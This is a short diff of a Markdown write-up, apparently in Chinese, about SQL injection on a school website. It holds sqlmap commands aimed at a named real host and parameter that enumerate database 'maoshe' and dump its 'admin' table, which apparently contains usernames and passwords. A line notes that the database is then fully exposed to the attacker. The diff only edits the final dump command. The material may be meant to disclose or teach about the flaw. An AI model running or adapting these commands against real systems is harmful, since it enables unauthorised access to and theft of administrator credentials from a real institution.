@@ -7,7 +7,7 @@
 ```
 sqlmap.py -u "http://www.sggs.hc.edu.tw:8080/news2/view.asp?ID=6843" --tables -D maoshe
 sqlmap.py -u "http://www.sggs.hc.edu.tw:8080/news2/view.asp?ID=6843" --columns -T admin -D maoshe
-sqlmap.py -u "http://www.sggs.hc.edu.tw:8080/news2/view.asp?ID=6843" --dump -C "username,passwd" -T admin -D maoshe
+sqlmap.py -u "http://www.sggs.hc.edu.tw:8080/news2/view.asp?ID=6843" --dump -T admin -D maoshe
 ```
 接者資料庫內容就被攻擊者一覽無遺了  
 ![sql](https://raw.githubusercontent.com/William957-web/SGGScyber/main/images/sqlinetion.png)  
